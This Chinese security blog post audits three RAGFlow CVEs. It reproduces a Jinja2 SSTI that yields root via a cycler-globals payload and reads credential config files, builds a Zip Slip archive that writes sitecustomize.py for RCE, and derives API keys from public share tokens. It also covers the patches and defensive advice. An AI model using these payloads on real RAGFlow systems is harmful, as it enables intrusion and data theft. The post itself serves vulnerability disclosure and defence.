---
title: 【先知】AGFlow 三洞审计：补丁追着漏洞跑，有个版本掉队了
source: https://xz.aliyun.com/news/92668
source_host: xz.aliyun.com
clip_date: 2026-08-11T15:27:45+08:00
trace_id: ff2c88ba-94b2-4fc7-ad08-5e05a501a74b
content_hash: d80dfcd1732db0880ac0a76a6b383ccd916c57792b1bade6dcfb73c09ccb6760
status: synced
tags:
  - 先知
  - 漏洞分析
  - RAGFlow
series: null
feed_source: 先知安全技术社区
ai_summary: RAGFlow v0.24.0 三个CVE中，SSTI修复迟到两个半月，普通账号即可RCE；Zip Slip和API key推导虽在更早版本修复，但旧版本仍受影响。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3b975244-d011-8188-b35d-cba63339b87f
ioc:
  cves:
    - CVE-2025-69286
    - CVE-2026-24770
    - CVE-2026-28797
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> RAGFlow v0.24.0 三个CVE中，SSTI修复迟到两个半月，普通账号即可RCE；Zip Slip和API key推导虽在更早版本修复，但旧版本仍受影响。
> 
> - **三个漏洞与修复版本：** CVE-2026-28797（SSTI，8.8分）v0.25.0修复；CVE-2026-24770（Zip Slip，9.8分）0.23.1修复；CVE-2025-69286（API key推导，9.8分）0.22.0修复。v0.24.0正好卡在SSTI补丁合入前（补丁2026-03-02合入，v0.25.0 2026-04-21才发布），两个半月裸奔。
> - **SSTI利用链：** 通过canvas DSL的script参数直接进入Jinja2模板渲染，使用`{{ cycler.__init__.__globals__.os.popen("id").read() }}`可获root；Message组件设置stream=False时完全绕过_is_jinjia2正则检测，无换行也可执行；StringTransform有检测但换行可绕过正则，不过在v0.24.0实际渲染入口包在检测内，换行payload无效。
> - **Zip Slip细节：** MinerU解析返回的zip条目名未校验，直接用os.path.join拼接解压路径；恶意zip构造`doc.pdf/`空目录做root hint，第二个条目`doc.pdf/../../evil.txt`实现路径穿越；0.23.1可写.venv/lib/python3.12/site-packages/sitecustomize.py实现RCE，0.24.0增加realpath逃逸检查后拦截。
> - **API key推导：** generate_confirmation_token以tenant_id为密钥、uuid1()为随机源，公开分享链接beta泄漏uuid主体（time_mid/version/clock_seq），枚举time_low首字符16种×delta范围实测98万次命中，delta实测-1380；0.24.0已改用secrets.token_urlsafe，推导失效。
> - **防御建议：** 升级到v0.25.0+；所有Jinja2Template调用点换SandboxedEnvironment；解压需对每个条目做绝对路径、..、realpath逃逸检查并处理反斜杠和符号链接；随机数一律secrets；关闭默认注册、内网部署。

复现环境：2核4G 的 Ubuntu 22.04，加了 2G swap 兜底，Docker 部署 RAGFlow v0.24.0。Web 端口 9380，API 端口 9390，容器是 ragflow、mysql、redis、minio 加一个 infinity 向量库。

前置条件：目标实例开着默认的注册入口，注册一个普通账号就能开始。文中所有漏洞验证的输出都是我在服务器上实际跑出来的，没改过。

## 写在前面

写这篇的起因有点简单：RAGFlow 是国产开源 RAG 引擎里热度最高的一个，GitHub 的 star 数很能打，但我在中文社区翻了一圈，全是部署教程和功能介绍，一篇安全分析都没有。加上 2026 年上半年它连着出了三个 CVE，官方打了两个补丁，还有一个到现在没打。我决定把源码拉下来看看。

三个洞分别是：

-   CVE-2026-28797：SSTI，8.8 分，v0.24.0 及之前受影响（v0.25.0 起修复）
-   CVE-2026-24770：MinerU 解析器 Zip Slip，9.8 分，0.23.1 修复
-   CVE-2025-69286：API key 与分享 token 可互推，9.8 分，0.22.0 修复

三个洞官方其实都修了，只是时间线差得很远：API key 在 0.22.0 就修了，Zip Slip 在 0.23.1 修了，SSTI 的修复 2026-03 才合入、v0.25.0 才发布。我部署的 v0.24.0 正好卡在修复前——它 2 月 10 日发布，沙箱修复 3 月 2 日才合入，等于这个版本从发布那天起就注定赶不上修复。掉队的版本，用户只能裸奔。这个"修复迟到"的窗口期和绕过细节，放到第五节说。

三个洞的杀伤力也不一样。Zip Slip 要等用户上传恶意文档触发，API key 推导要拿到公开分享链接，只有 SSTI 是注册个普通账号就能直接打，直接 root。

读代码的顺序我按漏洞影响排的：先追最严重的 SSTI，因为它没补丁；再回头看 Zip Slip 和 API key 的补丁 diff，验证旧版本是不是真能打。几份源码看下来有个共同点：这三个洞都不是什么复杂的逻辑漏洞，全是"用户可控的输入没有经过边界检查就直接进了危险函数"——模板渲染、路径拼接、随机数生成，都是常见的坑。但组合在 RAGFlow 这种系统里，就是一条完整的攻击链。

## 一、RAGFlow 是什么

### 组件化编排的 RAG 引擎

RAGFlow 和常见的 RAG 框架不太一样。它不是给开发者 import 的一个库，而是一整套带界面的系统：知识库、文档解析、检索、Agent 编排全都有。编排这部分叫 canvas，一张可视化流程图，节点就是各种组件：Begin、StringTransform、Message、Retrieval、Answer 等等。

画布在后台存成一段 DSL 结构，就是嵌套 JSON。组件之间用 downstream 和 upstream 串起来，跑的时候从 begin 开始往后执行。一个最简画布长这样：

```plain
{
  "components": {
    "begin": {"obj": {"component_name": "Begin", "params": {}},
              "downstream": ["c0"], "upstream": []},
    "c0": {"obj": {"component_name": "StringTransform",
                   "params": {"method": "merge", "script": "{{7*7}}", "delimiters": [","]}},
           "downstream": [], "upstream": ["begin"]}
  },
  "history": [], "path": ["begin"], "retrieval": [], "answer": ["c0"]
}
```

每个组件节点有 obj（组件名和参数）、downstream（下游节点）、upstream（上游节点）。跑起来就是一条链。这个设计本身没什么问题，毛病在组件参数的渲染方式上。

### 我部署的版本

环境是 2核4G 的轻量服务器，这个配置跑 RAGFlow 有点勉强。默认的 docker-compose 用 Elasticsearch，内存限制写死 8G，我 4G 的机器一启动就 OOM，直接卡死，SSH 都连不上，只能去控制台强制重启。

改了几个地方才跑起来：向量库换成 RAGFlow 自家的 infinity（.env 里 DOC_ENGINE=infinity），内存限制压到 2147483648，再加 2G swap 兜底。这里有个坑：infinity 是 docker compose 里独立的 profile，只启 cpu profile 的话 ragflow 容器会一直等向量库，日志里反复报连接失败。必须显式指定两个 profile：

docker compose --profile cpu --profile infinity up -d

另外 entrypoint.sh 从 GitHub 下载下来没有执行权限，得手动 chmod +x，不然容器起不来。这套环境折腾了大概一个下午，中间还遇到一次 docker daemon 端口分配残留，9381 报 already allocated 但 ss 里看不到，重启 docker 服务才解决。

### retrieval 和 answer 的隐藏要求

跑 canvas 的时候有个隐藏要求：DSL 里的 retrieval 字段必须是数组，空数组也行。我一开始填了 null，completion 直接报错，前端画布能保存但后端跑不起来。answer 字段要指组件的 id，执行结果才会被收集进 SSE 响应里。这两个字段在官方文档里提都没提，我是对着源码和报错一点点试出来的。

另外触发路径别搞混：/v1/canvas/debug 是调试接口，它创建的画布不落库，而且 params 覆盖不了组件配置里固化的参数，没法拿来注入。要打就是 set + completion 两步，set 把恶意 DSL 存进去，completion 正常触发。

### 从组件参数下手

审计这类系统的思路其实很直接：找出所有用户输入能流到的地方，看它们经过什么处理。RAGFlow 里用户输入最密集的就是 canvas DSL——组件名、参数、脚本全是我们自己填的。如果这些参数被当成代码执行，问题就大了。SSTI 就是这一类。

具体做法是从数据流入口开始：注册、登录、画布创建、文档上传、分享链接，每个入口进去的用户输入都标出来，然后追到执行点。追的时候重点搜 render、eval、exec、os.path.join、subprocess 这类危险调用，看用户输入有没有可能流进去。RAGFlow 的三个洞正好覆盖三类：模板渲染、路径拼接、随机数生成。

## 二、SSTI：官方修了，版本没跟上

### 追源码：script 参数直接进 Jinja2

先看 StringTransform 组件。这个组件的作用是处理字符串，按分隔符拆开、拼接、替换之类。它有个 script 参数，用来填"处理逻辑"。源码在 agent/component/string_transform.py：

```plain
template = Jinja2Template(script)
script = template.render(kwargs)
```

就这两行。Jinja2Template 是 from jinja2 import Template as Jinja2Template 直接引的，不是沙箱环境。script 是我们通过 canvas DSL 传进去的字符串，render 的时候拿它当模板渲染。

我一开始想走 /v1/canvas/debug 接口注入，这个接口是调试画布用的，请求里能带 query 参数。试了半天发现不行——debug 接口的 params 不会覆盖组件配置里已经固化的 script。组件实例在创建时把 self.\_param.script 存下来了，后续请求传什么参数都改不动它。这条路堵死之后，我改成直接看画布创建和执行的接口，真正的攻击路径是两条 API：

1.  POST /v1/canvas/set 创建画布，把恶意 script 写进 DSL
2.  POST /v1/canvas/completion 触发执行

### 登录这关：RSA 加密 + Authorization 头

动手之前先过认证。注册走 /v1/user/register，密码不能直接传明文，要先 RSA 加密：公钥在 /ragflow/conf/public.pem，加密方式是 PKCS1_v1_5，加密对象是 base64 之后的明文。我第一次直接传明文密码，接口报错，翻代码才发现要加密。

登录成功之后还有个坑：凭证在响应头 Authorization 里，是 Quart-Auth 用 SECRET_KEY 签名的 itsdangerous token；body 里的 access_token 只是个 UUID，拿它调 API 直接 401。我当时抓响应头才发现，登录接口返回的 JSON 里那个 access_token 看着像凭证，其实没用。正确姿势是 curl 的时候把响应头存下来，后面所有请求带 Authorization 头的完整值。

### 复现：{{7*7}} 真的算出了 49

先拿最小 payload 验证渲染是否生效。构造一个只有 begin 和 c0 两个组件的 DSL，script 填 {{7*7}}，用第一节那个 JSON 结构 POST 到 /v1/canvas/set，拿返回的画布 id，再 POST /v1/canvas/completion：

{"id": "<画布id>", "query": "hello"}

completion 的响应是 SSE 流，节点执行完会发 node_finished 事件，outputs 字段里带执行结果。SSE 是流式的，curl 要加 -N 参数才不会等缓冲，我翻到的是：

result: "49"

{{7*7}} 被当成 Jinja2 表达式算出来了。模板渲染确认。这里有个细节值得说：StringTransform 的 script 参数在 DSL 里就是普通字符串，服务端拿到之后直接 new 一个 Jinja2Template，没有任何 escape 或者白名单。Jinja2 模板语法和字符串内容完全混在一起，这是典型的 SSTI 入口。

### 从渲染到 RCE：cycler 一路摸到 os

Jinja2 的 SSTI 利用链很成熟，不需要自己找 gadget。cycler 是 jinja2 自带的类，通过 cycler.\__init\_\_.\__globals\_\_ 能拿到整个模块的全局命名空间，里面挂着 os。payload 就一行：

{{ cycler.\__init\_\_.\__globals\_\_.os.popen("id").read() }}

执行结果：

uid=0(root) gid=0(root) groups=0(root)

root。容器里跑的就是 root 用户，RCE 直接到手。到这一步，知识库里的文档、向量数据、账号信息全都能拿。

我接着试了读配置文件：

{{ cycler.\__init\_\_.\__globals\_\_.os.popen("cat /ragflow/conf/service_conf.yaml").read() }}

service_conf.yaml 里存着 MySQL 连接串、MinIO 的 access key、Elasticsearch 地址，全部明文。这是整个系统的凭证仓库，一个 SSTI 全交代了。

### 翻车现场：Message 组件连检测都没有

StringTransform 至少还有一层 \_is_jinjia2 检测。在 message.py 里我看到了这个函数：

```plain
def _is_jinjia2(s):
    return re.search(r'\{%.*%\}', s) or re.search(r'\{\{.*\}\}', s) or re.search(r'\}\}', s)
```

检测到 {{ 或 {% 才走模板渲染分支。问题在于 Message 组件，它的渲染逻辑长这样（message.py:183）：

```plain
template = Jinja2Template(rand_cnt)
content = template.render(kwargs)
```

\_is_jinjia2 在这里只拦 stream=True 的分支：stream 模式且内容不像模板，才原样输出；stream=False 的时候，内容直接交给 Jinja2Template 渲染，不检查模板语法。我的 payload 设的 stream=False，等于绕过了检测，无条件执行。我在 Message 组件里填了同样的 payload，一样打出 root。这个组件比 StringTransform 更省事——把 stream 关掉，连"看起来像模板"这一步检查都没有。

### 换行绕过：正则不跨行

\_is_jinjia2 的正则 r'\\{%.\*%\\}' 没有 DOTALL 标志，. 匹配不了换行符。我单独调这个函数验证过：payload 只要在 {% 和 %} 之间插入换行，检测直接返回 False。

```plain
_is_jinjia2('{%
print(7*7)
%}')  # -> False
```

但这里有个细节容易踩坑：在 StringTransform 上，检测 False 意味着不渲染，换行 payload 在它身上无效——v0.24.0 的 StringTransform 渲染入口就包在 if self.\_is_jinjia2(script): 里面。真正的问题是 Message 组件：stream=False 的时候它根本不调用 \_is_jinjia2，内容直接进渲染。换行 payload 在 Message 上实测打出 root——这里没有检测，谈不上绕过。

正则黑名单的问题不是"能被绕过"，而是"组件之间不统一"。StringTransform 有检测，Message 没有，补丁只能一个一个追。

## 三、Zip Slip：解压路径没人管

### MinerU 解析器

RAGFlow 的文档解析走 MinerU，一个独立的开源项目，负责把 PDF、Word 转成可检索的文本。处理流程是：上传文档 → MinerU API 解析 → 返回 zip 包 → 主服务解压后入库。zip 里装的是解析出的 markdown、图片、切块后的元数据，条目名带 root 目录。这个"解析完打包再解包"的设计本身没问题，坑在解包那一步信任了 zip 条目名。

deepdoc/parser/mineru_parser.py，0.23.1 的代码：

```plain
def _extract_zip_no_root(self, zip_file):
    ...
    full_path = os.path.join(extract_to, path)
    ...
```

zip 条目里的 path 直接拼到解压目录后面，没有任何检查。如果 path 是../../evil.txt，os.path.join 会把文件写到解压目录外面。

### 恶意 zip 怎么构造

构造 zip 用 Python 的 zipfile 就行，关键是把条目名写成 doc.pdf/ 开头，让 MinerU 的 root hint 逻辑把它当成 PDF 解析结果的根目录：

```plain
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('doc.pdf/', '')
    z.writestr('doc.pdf/../../evil.txt', 'PWNED_BY_ZIPSLIP')
```

第一个空目录条目 doc.pdf/ 是给 root hint 看的，第二个条目才是真正的穿越载荷。root hint 是 MinerU 的约定：解析结果 zip 的第一个条目是根目录名，后续条目都以它开头。攻击者的 zip 第一个条目写 doc.pdf/，等于告诉解压方"这是 doc.pdf 解析结果的一部分"，第二个条目实际路径却穿出去了。除了.. 穿越，绝对路径条目（/etc/passwd 这种）也是同类问题；符号链接条目在工具检测里单独处理。

### 双版本对比：同一个 zip，两种结局

我构造了一个恶意 zip，第一个条目是 doc.pdf/，这个前缀是给 MinerU 的 root hint 逻辑做提示的，让它把后续条目都当 doc.pdf 的一部分；第二个条目是 doc.pdf/../../evil.txt，内容写 PWNED_BY_ZIPSLIP。

0.23.1 的逻辑解压：/tmp/evil.txt 被写出来了，内容完整。

0.24.0 的逻辑解压：直接抛异常：

RuntimeError: Unsafe zip path (traversal)

0.24.0 加了几道检查：绝对路径检查、路径 components 里的.. 检查、os.path.realpath 解析后是否逃逸出目标目录的检查。拆开看就是几层 if：第一层拦以 / 或盘符开头的条目，第二层拦路径里带.. 的条目，第三层把解压目标 resolve 成绝对路径之后，确认拼接结果还在目标目录范围内。我的验证方式是把两版函数都抠出来，在容器里跑同一个 zip。不用重新部署旧版，对比证据足够清楚。

### sitecustomize.py：把 RCE 闭环

Zip Slip 能写文件，写到哪里才有价值？写 /tmp 只是证明，要变成 RCE 得找个 Python 启动时会自动加载的位置。cron、systemd 这些位置要么写不了要么不好控制，Python 的 sitecustomize.py 是最省事的：放进去一次，之后每次 python3 起来都会执行。

Python 有个机制：sitecustomize.py 放在 site-packages 目录下，任何 python3 解释器启动时都会自动 import 它。RAGFlow 的虚拟环境在.venv/lib/python3.12/site-packages/。我把恶意 zip 的条目改成：

doc.pdf/../../../../.venv/lib/python3.12/site-packages/sitecustomize.py

内容：

```plain
import os
os.system('echo PWNED_BY_ZIPSLIP_RCE > /tmp/zipslip_rce_proof.txt')
```

0.23.1 的代码会把这个文件写进虚拟环境。之后任何一次 python3 进程启动，都会执行这段代码。文件写进去之后，我验证了 /tmp/zipslip_rce_proof.txt 确实生成——RCE 闭环完成。0.24.0 对同一个 zip 直接 BLOCKED。

整个调用链：MinerU API 的 /file_parse 返回 zip → 主服务 \_extract_zip_no_root 解压 → zip 内容完全由攻击者控制。攻击者只需要让目标解析一个恶意 PDF，就能往服务器任意位置写文件，接下来就是等一次 python3 启动。

## 四、API key：从分享链接到密钥

### token 生成的毛病

第三个洞出在 API key 的生成逻辑上，api/utils/api_utils.py:413，0.21.0 的代码：

```plain
def generate_confirmation_token(tenant_id):
    serializer = URLSafeTimedSerializer(tenant_id)
    return "ragflow-" + serializer.dumps(get_uuid(), salt=tenant_id)[2:34]
```

URLSafeTimedSerializer 是 itsdangerous 的签名序列化器，密钥用的是 tenant_id。这里几个问题叠在一起：

1.  密钥可预测——tenant_id 就是租户 ID，攻击者自己注册一个账号就有自己的 tenant_id
2.  get_uuid() 返回 uuid.uuid1()，基于时间戳和 MAC 地址生成，时间戳部分可预测
3.  serializer.dumps 的 payload 是 base64 明文，uuid 字符串直接可见

更要命的是，RAGFlow 的分享链接 token（beta）也走这个函数。beta = generate_confirmation_token(token).replace("ragflow-", "")\[:32\]。也就是说，beta 的"密钥"就是 API key token 本身——生成 token 和生成 beta 是相邻两次 uuid1() 调用，间隔微秒级。

### 公开的 beta 泄露了 uuid 主体

分享链接是公开的，不需要登录就能拿到。/chatbots/ 下面的分享 bot、/agentbots/ 的分享链接都行。拿到的 beta 形如：

IzZGI3ODMwLTk1MmEtMTFmMS04MTZiLT

这是 dumps 输出的中间片段。URLSafeTimedSerializer 的完整输出是 签名.时间戳.载荷 三段点分隔的 base64，代码里取 \[2:34\] 从中间切——开头混着签名残留，尾部也被截掉，直接解码是乱码。但载荷是明文 base64，用 A 字符填充对齐之后，uuid 主体就露出来了：

3db7830-952a-11f1-816b-

time_mid、version、clock_seq 全在，time_low 只剩首字符是未知的。截断丢掉的部分主要是签名，而密钥（tenant_id）只参与签名——签名被切掉了，密钥是什么根本不重要。

我把 token 和 beta 放在一起对比：

```plain
token: ragflow-IzZGI3MmNjLTk1MmEtMTFmMS04MTZiLT
beta :        IzZGI3ODMwLTk1MmEtMTFmMS04MTZiLT
```

token 那边 A 填充解出来是 3db72cc-952a-11f1-816b-，beta 这边是 3db7830-952a-11f1-816b-。time_mid、version、clock_seq 完全一样，只有 time_low 差一点——两次 uuid1() 调用间隔很短，微秒级。

### uuid1 的字段拆解

先看 uuid.uuid1() 生成的结构，128 位分成五段：

time_low(32位) - time_mid(16位) - version(4位) - clock_seq(14位) - node(48位)

uuid1 的时间戳就是 60 位（time_low + time_mid + version 里的高位），单位是 100 纳秒。node 是 MAC 地址。

对照 base64 明文 payload：time_mid、version、clock_seq 全暴露，time_low 只缺首字符（截断丢的），node 通过自己账号的 user_id 拿到——同一台服务器上所有 uuid1() 调用 node 都一样。剩下要枚举的只有 time_low 首字符 16 种，加上相邻调用之间的时间差。

100 纳秒的时间戳精度意味着同一进程里连续两次 uuid1() 调用，time_low 相差很小——这就是枚举 delta 范围能收敛的原因。clock_seq 是时钟序列号，进程每次启动随机初始化，但同一个进程内连续生成时保持不变。这三个特性叠加，就是 token 可推导的数学基础。

### 98 万次枚举

恢复 uuid 主体之后，还差 time_low。uuid1 的 time_low 是 32 位，但 base64 截断 \[2:34\] 已经把 time_low 的后 7 个 hex 字符暴露了，只剩首字符 16 种可能。再加上 uuid1 的时间戳是连续的，相邻两次调用间隔很小，枚举 time_low 首字符 16 种 × 相邻时间戳 delta 范围，实测 98 万次命中。这个量级，本地脚本跑完不费劲。

node 部分（MAC 地址）从哪来？uuid1 的 node 就是 MAC 地址。同一台服务器上所有 uuid1() 调用，node 都一样。攻击者自己注册账号时，user_id 也是 uuid1().hex，后 12 位就是 node。

实测跑完枚举，命中的 delta 是 -1380。微秒级间隔，和"token、beta 在同一次 new_token 调用里生成"完全吻合。

候选 token 怎么验证？RAGFlow 的 \_load_user 里，API key 认证走 Authorization 头，两段式，第二段直接查 APIToken 表——拿候选 token 拼上 Authorization 去调 API，200 就是命中，401 就继续。枚举脚本不用真的把 98 万个候选全部请求一遍——delta 是按顺序扫的，命中点通常在某个区间内，跑起来比想象中快。实际利用里，攻击者只要拿到一个公开分享链接，就能推导出受害者的 API key，进而以受害者身份调 API 拉数据。

NVD 标注 CVE-2025-69286 影响 0.22.0 之前的版本。我拿 0.24.0 的代码做修复后对比，generate_confirmation_token 已经是这样：

```plain
def generate_confirmation_token():
    import secrets
    return "ragflow-" + secrets.token_urlsafe(32)
```

secrets.token_urlsafe 是密码学安全随机，没有时间戳没有 MAC，推导这条路彻底断了。这个修复很干净，没留尾巴。

## 五、第四个盲区：修复迟到的两个半月

### 为什么难修

三个洞看下来，SSTI 是修复最曲折的一个。为什么难修？因为根因不是某个函数写得糙，而是"用户可控的字符串被当模板渲染"这个设计本身。修法只有两个方向：检测（黑名单）或者沙箱（隔离）。

渲染入口还不止一处：StringTransform 一个、Message 一个，以后新增组件只要带 content、script 这类参数，都可能再长出一个渲染入口。修复要覆盖所有走 Jinja2Template 的地方，不只是当前两个组件。这种设计层面的风险，比单个函数写错难修得多——函数写错改一行，设计问题要动架构。

### 检测和沙箱都不省心

检测方向就是 \_is_jinjia2 这种正则，换行 payload 就能绕过去。而且 Message 组件的检测只拦 stream=True 的分支，stream=False 时内容直接进渲染，等于没有检测。

检测的问题在于它是黑名单思维：你只能拦你想到的语法。今天拦 {{ 和 {%，明天有人用 {# 注释语法做载体，后天用字符串拼接绕过。这种思路永远在追着攻击者跑，而攻击者只需要找到一个漏网语法。

沙箱方向，jinja2 有 SandboxedEnvironment。官方后来确实走了这条路——把两个组件的渲染入口都换成了沙箱。但沙箱也不是保险箱，jinja2 沙箱绕过在 CTF 里是常客。

### 检测思路的尽头

正则之外还有 AST 解析的思路：把 script 交给 jinja2 的 parser 解析成语法树，检查里面有没有越界的表达式。这个思路比正则强，但实现起来要覆盖 Jinja2 的完整语法——条件、循环、过滤器调用、宏定义，任何一个语法漏网都可能变成利用入口。而且 AST 检查本身也增加了渲染路径的复杂度，维护成本不低。

我的结论是：这类"用户可控字符串进模板"的场景，黑名单方向没有未来，只能靠沙箱加最小权限。检测代码写得再好，也是在跟攻击者的思路赛跑，而攻击者只需要赢一次。

### 官方其实修过：7fc97da610

我写到这里的时候去翻了一下 GitHub 提交历史，结果发现官方修过 SSTI——2026-03-02 合入了一个 security commit（7fc97da610，PR #13305），标题是 "Adopt Jinja2 SandboxedEnvironment for template rendering"。diff 很清楚，message.py 和 string_transform.py 各改 4 行：

```plain
-from jinja2 import Template as Jinja2Template
+from jinja2.sandbox import SandboxedEnvironment
+
+_jinja2_sandbox = SandboxedEnvironment()
```

```plain
-template = Jinja2Template(rand_cnt)
+template = _jinja2_sandbox.from_string(rand_cnt)
```

修复方向没问题，把原生 Template 换成沙箱环境。我把 cycler 链、lipsum 链、 **class** 链都丢进 SandboxedEnvironment 试了一遍，全被 SecurityError 拦下（access to attribute ' **init** ' is unsafe），官方这个修复是有效的。问题出在版本覆盖：这个 commit 是 3 月 2 日合入的，但 v0.25.0 到 4 月 21 日才发布。v0.24.0 是 2 月 10 日发布的，正好卡在修复之前——NVD 里 CVE-2026-28797 的影响范围也写着 "0.24.0 and prior"。也就是说，从 v0.24.0 发布到 v0.25.0 发布，中间两个半月，跑着 v0.24.0 的实例全部裸奔。我验证用的就是 v0.24.0，实测 SSTI 直接 root。

### 修复后的残留问题

沙箱进了 v0.25.0，但两个组件的处理方式不一样。StringTransform 变成"检测到模板语法才进沙箱渲染"，换行 payload 在这里会失效——检测不到就不渲染了。Message 组件呢？最新版 v0.26.4 里，stream=False 的时候依然无条件进渲染，只是渲染器从原生 Template 换成了沙箱。所以修复后的 Message 依赖的是沙箱本身的强度，而不是任何前置检查。

这个盲区的价值：补丁合入不代表漏洞死了。v0.24.0 用户裸奔的两个半月，就是"合入了但没发布"和"发布了但没覆盖"两个环节叠出来的。换行绕过和 stream=False 直渲染这两个点，在 v0.25.0 之前的版本上都是真实可利用的。

## 六、攻击路径怎么选

### 都是普通账号起步

三个洞有个共同点：入口权限都是普通账号。SSTI 要能建 canvas，Zip Slip 要能传文档，API key 要能拿到分享链接——这三件事 RAGFlow 的普通用户都能干，不需要管理员。对攻击者来说，注册入口默认开着，等于免费送一个合法账号，三条路都能走。

RAGFlow 的权限模型很扁平：普通用户能建知识库、传文档、创建和运行画布、生成分享链接。我们测试用的就是普通账号，建画布、触发执行这些操作全都能干。所以"普通账号"在这里等于"能用核心功能"，三个洞的入口全在核心功能里。

### 隐蔽性和影响面的取舍

三条路其实对应不同的攻击意图：

-   要立刻拿 shell：走 SSTI，一次请求直接 root，缺点是动静大，canvas 创建和 SSE 执行都会在服务端留记录
-   要持久化：走 Zip Slip 写 sitecustomize.py，文件进去之后每次 python3 启动都执行，隐蔽性最好，缺点是触发链长，要先让目标解析恶意文档
-   要偷数据：走 API key 推导，拿到的是合法凭证，可以用来调 API 拉知识库内容，但前提是能拿到受害者的分享链接

### 从 RCE 到数据

SSTI 那条路还能往下走一步：读 service_conf.yaml 拿到 MySQL、MinIO、Elasticsearch 的全量凭证。这些凭证是从 RCE 到数据的桥——RCE 只是起点，知识库里的文档和向量数据才是目的。到这一步，攻击者就同时握住了三套数据库的钥匙。具体的连接利用方向就不展开了，方法都摆在这了。

拿到凭证之后，MySQL 在 3306、MinIO 在 9000、Elasticsearch 在 9200，都是容器内网地址，从 ragflow 容器里能直连。知识库的文档原文在 MinIO，索引和元数据在 MySQL 和 ES。这一步我没有继续往下打——拿到凭证已经足够说明问题。

## 七、工具：ragflow-audit.py

### 三个子命令

验证完三个洞，我把过程整理成一个工具 ragflow-audit.py，代码已经开源在 GitHub： [https://github.com/qianlijaingshan/ragflow-audit](https://github.com/qianlijaingshan/ragflow-audit) 。三个子命令对应三个漏洞：

-   ssti：构造恶意 canvas DSL，创建画布 + 触发执行，自动验证 RCE，支持 StringTransform / Message 两种组件和换行绕过 payload
-   zipslip：离线检测 zip 条目的路径穿越 / 绝对路径 / 符号链接
-   apikey：从分享 beta 解码 uuid 主体，提取 node，枚举 time_low

三个子命令的定位不一样：ssti 是主动利用，需要一个活的 RAGFlow 实例和合法账号；zipslip 是离线检测，给个 zip 就能查，适合集成到文件上传前的检查流程；apikey 是分析框架，输入分享链接的 beta 和攻击者自己的 user_id，输出推导过程的中间结果。工具故意用标准库实现，任何机器上直接 python3 就能跑。

### 认证的坑

SSTI 子命令的认证参数有个坑，我单独说一下：RAGFlow 的登录凭证在响应头 Authorization 里，不是 body 里的 access_token。body 里那个 access_token 只是个 UUID，拿去调 API 直接 401。我当时被这个卡了一阵，抓响应头才发现。另外登录密码要先 RSA 加密，公钥在 /ragflow/conf/public.pem，加密方式是 PKCS1_v1_5，直接传明文密码会报错。

工具用 Python 标准库写的，urllib 发请求，没有第三方依赖，服务器上直接 python3 就能跑。ssti 和 zipslip 子命令我在环境里实测跑通了，apikey 子命令的 uuid 恢复逻辑也单独验证过。

### 运行效果

工具入口很简单：

```plain
usage: ragflow-audit.py [-h] {ssti,zipslip,apikey} ...

RAGFlow 三洞审计工具

positional arguments:
  {ssti,zipslip,apikey}
    ssti                SSTI -> RCE 检测利用
    zipslip             Zip Slip 离线检测
    apikey              API key 推导 (CVE-2025-69286)

options:
  -h, --help            show this help message and exit
```

ssti 子命令跑起来之后，会先创建画布，再触发执行，最后匹配输出里的 uid= 字段判断 RCE 是否成功。zipslip 是离线检测，给个 zip 就返回条目列表里有没有穿越、绝对路径、符号链接。apikey 子命令会把 beta 解码、uuid 主体恢复、枚举进度都打印出来。

## 八、防御建议

### 升级，别停在 v0.24.0

SSTI 的沙箱修复在 v0.25.0 才发布，如果还停在 v0.24.0 及之前，三个洞全中。升级到 v0.25.0 及以上，Zip Slip（0.23.1 修）和 API key 推导（0.22.0 修）也一起覆盖了。升级之后 Message 组件依然无条件进渲染，只是渲染器换成了沙箱——沙箱本身的强度要持续关注。

升级本身不复杂，docker compose pull 之后 up -d 就行，mysql、minio 的数据卷不用动。升完我建议跑一遍冒烟：登录、建一个空画布、触发一次 completion，确认服务正常。我们验证的时候发现，升级后 Message 组件的行为会变——渲染器从原生 Template 换成沙箱，如果你不知道这个变化，排查问题的时候会懵一阵。

### 组件渲染入口换沙箱

所有 Jinja2Template 的调用点换成 SandboxedEnvironment，这是治本的方向。检测正则只能算缓兵之计，换行绕过就是活例子。改造的时候注意别只改 StringTransform 一处——Message、以及将来新增的组件，只要走模板渲染就得统一处理，不然就是给攻击者留口子。

动手前先全局搜一下 Jinja2Template 和 from_string 的调用点，把每个入口都列出来，别只改自己看到的组件。改完用已知 payload 回归一遍：cycler 链、lipsum 链、 **class** 链，这三条应该全部被 SecurityError 拦下——我们实测过，SandboxedEnvironment 对它们都有效。另外 Message 组件的 stream 分支有两套处理路径，改的时候别漏了其中一套。

### 解压防护参考 0.24.0

这套检查：绝对路径、.. 组件、realpath 逃逸。这个模式可以直接抄，任何解压用户输入 zip 的代码都应该有。另外提醒一句：这类检查要放在解压循环里对每个条目做，不是解压完再统一检查——解压动作本身就会写文件，事后检查拦不住已经发生的穿越。

实现的时候还有两个细节容易漏：一是 Windows 路径的反斜杠，zip 里..\\ 和 /../ 一样危险，检查前先把反斜杠统一替换成斜杠；二是符号链接条目，external_attr 的类型位能识别出来，链接本身解压出去不可怕，可怕的是链接指向的位置被后续代码当成普通文件读写——这条我们在工具里单独做了检测。

### token 生成用 secrets

UUID 派生密钥这种模式，审计时见到直接标红。随机数生成一律 secrets 模块，别自己拼时间戳。

审计的时候看到 uuid.uuid1()、uuid.uuid4() 或者 time.time() 拼出来的"随机"字符串，直接标红。uuid1 的时间戳和 MAC 都可预测，uuid4 虽然随机但也不该用在密钥这类场景。RAGFlow 这次就是从 uuid1 换到 secrets.token_urlsafe 修掉的——diff 只有一行，但推导这条路彻底断了。修这种问题的成本很低，拖着不修的成本是攻击者拿着公开分享链接就能推你的 API key。

### 部署面收敛

RAGFlow 默认注册是开着的。公网暴露 + 开放注册 = 攻击者直接拿一个合法账号。SSTI 打的是认证后的功能，普通账号就够。内网部署 + 关闭注册 + 反向代理加一层认证，能挡住绝大多数脚本扫描。

## 九、总结

三个 CVE，两个准时修的，一个迟到了两个半月。补丁追着漏洞跑，但追得够不够快、覆盖得够不够全，直接决定用户要裸奔多久。

审计这种组件化系统，我最后就盯一件事：我传进去的字符串，到执行之前被谁处理过。script 进了模板渲染，zip 文件名拼进了解压路径，token 的随机源是 uuid1——每个从输入到执行的环节都是攻击面。每个环节过一遍，漏洞基本就浮出来了。

